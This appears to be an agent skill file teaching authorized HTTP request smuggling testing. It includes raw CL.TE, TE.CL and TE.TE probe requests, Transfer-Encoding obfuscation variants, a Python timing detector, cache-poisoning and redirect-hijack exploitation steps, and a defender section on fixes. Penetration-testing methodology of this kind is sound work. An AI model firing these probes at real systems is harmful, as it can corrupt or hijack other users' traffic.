---
name: http-request-smuggling
description: Use when testing for HTTP request smuggling (desync) between a
  front-end proxy and a back-end server on an authorized engagement. Covers
  CL.TE, TE.CL, and TE.TE detection with timing probes, obfuscated
  Transfer-Encoding variants, confirming desync with differential responses,
  and safe exploitation such as prefix-based cache poisoning or redirect
  hijacking. Use when the target sits behind a CDN, load balancer, or reverse
  proxy, or when Burp Suite 2026.2 flags ambiguous Content-Length and
  Transfer-Encoding handling.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [webapp-pentest-methodology, web-sqli]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

HTTP request smuggling exploits disagreement between a front-end server
(CDN, load balancer, reverse proxy) and a back-end server about where one
HTTP request ends and the next begins. The attacker smuggles a second,
hidden request inside the first, and the back end executes it as if it came
from another user. Impact ranges from cache poisoning to full request
hijacking. This skill covers the authorized methodology: timing-based
detection, variant classification, safe confirmation, and controlled
exploitation. All testing targets systems you have written permission to
test. Smuggling tests can poison other users' requests, so keep every probe
non-destructive, timeboxed, and inside the agreed window.

## Quick Workflow

1. Confirm the architecture: identify the front end (response headers,
   CDN markers) and note that two servers parse the same bytes.
2. Send the baseline timing probe with both `Content-Length` and
   `Transfer-Encoding: chunked` to detect a desync.
3. Classify the variant: CL.TE, TE.CL, or TE.TE, using the timing
   signatures in sections 2 to 4.
4. Confirm with a differential response that does not harm other users
   (a unique header or a harmless prefix, never a destructive payload).
5. Attempt controlled exploitation: prefix-based cache poisoning or a
   redirect to your test domain, only if the rules of engagement allow
   it.
6. Stop immediately if other users' traffic is affected; report and
   coordinate a retest window.
7. Record the exact raw requests, timing deltas, and the variant for the
   report.

## 1. Baseline timing probe

Send a POST that carries both headers. If the front end prefers
`Content-Length` while the back end prefers `Transfer-Encoding` (or the
reverse), the leftover bytes desynchronize the connection, which shows up
as a delay.

```bash
# Raw request via printf and openssl (keeps exact bytes under your control)
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \
| openssl s_client -quiet -connect target.example:443 2>/dev/null | head -20
```

The timing method: send the probe, then immediately send a normal
request on the same connection. If the normal request is delayed (the
back end is waiting for the smuggled bytes to complete), you have a
desync. Burp Suite 2026.2 automates this in Repeater: paste the raw
request, send it twice in quick succession, and compare response times.
A consistent delay of several seconds on the second request is the
signal. No delay means either no desync or the variant needs the
mirrored header order.

## 2. CL.TE variant

The front end uses `Content-Length`, the back end uses
`Transfer-Encoding`. The front end forwards only `Content-Length` bytes,
so the chunked remainder (starting with the smuggled request) stays in
the back-end buffer and prefixes the next request.

```bash
# CL.TE probe: front end sees CL:6 ("0\r\n\r\n"), back end reads chunked
# body and treats the rest as the start of the next request
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' \
| openssl s_client -quiet -connect target.example:443 2>/dev/null | head -5
```

Confirmation technique: follow the probe with a normal GET and look for
the response to the smuggled prefix. The classic safe differential is
to smuggle `GET /hopefully404 HTTP/1.1` with junk headers and watch for
a 404 status on the follow-up response instead of the expected 200. A
404 where a 200 belongs proves the back end processed your smuggled
bytes. Keep the smuggled request harmless: a GET to a nonexistent path.

## 3. TE.CL variant

The front end uses `Transfer-Encoding`, the back end uses
`Content-Length`. Here the front end forwards the chunked body and
strips nothing, while the back end stops reading at `Content-Length`
bytes, leaving the tail to be treated as a new request.

```bash
# TE.CL probe: chunked body ends at "0\r\n\r\n", but CL:4 makes the
# back end stop early, leaving "G..." buffered as a new request
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \
| openssl s_client -quiet -connect target.example:443 2>/dev/null | head -5
```

The timing signature is inverted from CL.TE: the delay appears when the
headers are ordered so the front end commits to chunked parsing. If the
baseline probe shows nothing, swap the order of the `Content-Length`
and `Transfer-Encoding` header lines and retest; some stacks decide by
header order.

## 4. TE.TE variant with obfuscation

Both servers support chunked encoding, but one can be tricked into
ignoring the `Transfer-Encoding` header through obfuscation, turning the
pair into a de facto CL.TE or TE.CL.

```bash
# Obfuscation variants: one of these makes a server ignore the TE header
# while the other honors it. Test each in place of the plain header.
for te in \
  'Transfer-Encoding: xchunked' \
  'Transfer-Encoding : chunked' \
  'Transfer-Encoding: chunked ' \
  'X: X\nTransfer-Encoding: chunked' \
  'Transfer-Encoding: chunked, x' \
  ; do echo "== $te"; done
```

```bash
# Example: space before the colon (some servers reject, some normalize)
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG' \
| openssl s_client -quiet -connect target.example:443 2>/dev/null | head -3
```

```bash
# Example: vertical tab or other whitespace inside the header value
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 6\r\nTransfer-Encoding:\x0bchunked\r\n\r\n0\r\n\r\nG' \
| openssl s_client -quiet -connect target.example:443 2>/dev/null | head -3
```

Work through obfuscations one at a time with the timing test from
section 1. The variant that suddenly produces a delay is your TE.TE
differential. Document the exact bytes: the finding is only
reproducible with the precise obfuscation.

## 5. Safe confirmation with differential responses

Never smuggle destructive requests (no DELETE, no state changes, no
login attempts as other users). The safe confirmation ladder:

1. Timing differential (sections 1 to 4): no payload beyond the probe.
2. Status code differential: smuggle `GET /<random-404> HTTP/1.1` and
   confirm the follow-up response is 404 instead of 200.
3. Header differential: smuggle a request that triggers a distinctive
   response header your test server can recognize, such as a request to
   a debug endpoint that echoes a canary header value.

```python
#!/usr/bin/env python3
"""Timing-based smuggling detector (authorized targets only)."""
import socket, ssl, time

HOST = "target.example"
BODY = (
    "POST / HTTP/1.1\r\nHost: target.example\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
    "0\r\n\r\nG"
)
def one_shot(payload):
    s = ssl.create_default_context().wrap_socket(
        socket.create_connection((HOST, 443), timeout=10),
        server_hostname=HOST)
    s.sendall(payload.encode())
    start = time.time()
    try:
        s.recv(4096)
    except socket.timeout:
        pass
    s.close()
    return time.time() - start

base = one_shot("GET / HTTP/1.1\r\nHost: target.example\r\n\r\n")
probe = one_shot(BODY)
print(f"baseline={base:.2f}s probe={probe:.2f}s desync={probe - base > 3}")
```

Run each test at least three times. Network jitter causes false
positives; a real desync is consistent.

## 6. Controlled exploitation (only with explicit permission)

If the rules of engagement allow impact demonstration, prefer these two
non-destructive primitives:

- Prefix-based cache poisoning: smuggle a prefix that makes the back
  end cache a response with attacker-controlled content under a normal
  URL, then show the poisoned page served to your own second session.
  Keep the TTL short and coordinate cache purging with the client.
- Redirect hijack: smuggle bytes that turn the next user's request into
  a 302 to your test domain, then demonstrate with your own victim
  session only.

Never attempt to hijack real users' sessions, never exfiltrate data
belonging to others, and never leave poisoned cache entries behind.
Each exploitation attempt gets its own timeboxed window, and you stop
at the first sign of collateral impact.

## Edge cases

- HTTP/2 to the front end: the front end may translate H2 to HTTP/1.1
  for the back end, which reintroduces desync (H2.CL, H2.TE). Test with
  an H2-capable client when the front end speaks H2.
- The front end normalizes or strips the `Transfer-Encoding` header:
  detection then requires TE.TE obfuscation or is impossible; report
  the architecture, not a finding.
- Connection reuse is disabled (each request gets a new back-end
  connection): smuggling cannot work, because the smuggled bytes have
  no next request to attach to.
- The application sits behind multiple proxies: each hop is a new
  front-end/back-end pair, so test each layer separately.
- WAFs may block the word `chunked` or the probe shape: the absence of
  a signal behind a WAF is inconclusive, say so explicitly.
- Timeouts differ per layer: a slow back end can mimic the timing
  signature, so always confirm with a status differential, not timing
  alone.

## Escalation

- Plain CL.TE and TE.CL fail: move to the TE.TE obfuscation list in
  section 4, testing one mutation per run.
- Timing is inconclusive: switch to the 404 status differential, which
  does not depend on measuring delays.
- The back end closes the connection after the probe: try the
  `X: X` line-split variant, which survives some normalizers.
- Front end is HTTP/2 only: research H2 desync vectors (request body
  confusion via `:protocol` downgrades) against the specific CDN.
- You confirm desync but cannot exploit safely: report the confirmed
  desync with the differential evidence. A confirmed desync is already
  a high severity finding without weaponization.

## Detection and defender view

Defenders see request smuggling as bursts of 400 Bad Request responses,
connections where one TCP stream carries mismatched `Content-Length`
and `Transfer-Encoding` headers, unparsed bytes appearing at the start
of legitimate users' requests in back-end logs, and cache entries whose
content does not match the cached URL. The durable fixes are rejecting
requests that carry both `Content-Length` and `Transfer-Encoding`
(RFC 7230 says a server MUST reject them), normalizing or stripping
ambiguous headers at the front end, using HTTP/2 end to end where the
framing is unambiguous, and disabling back-end connection reuse across
different security contexts. WAF rules help only against known probe
shapes, not the underlying parsing disagreement.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-444 (Inconsistent Interpretation of HTTP Requests, HTTP Request
  Smuggling).
- RFC 7230 section 3.3.3: servers MUST reject ambiguous
  Content-Length with Transfer-Encoding.
- PortSwigger research by James Kettle: HTTP Desync Attacks (CL.TE,
  TE.CL, TE.TE taxonomy and obfuscation catalog).
- PortSwigger Web Security Academy: HTTP request smuggling labs.
- Burp Suite 2026.2 documentation: Repeater raw request editing for
  desync testing.
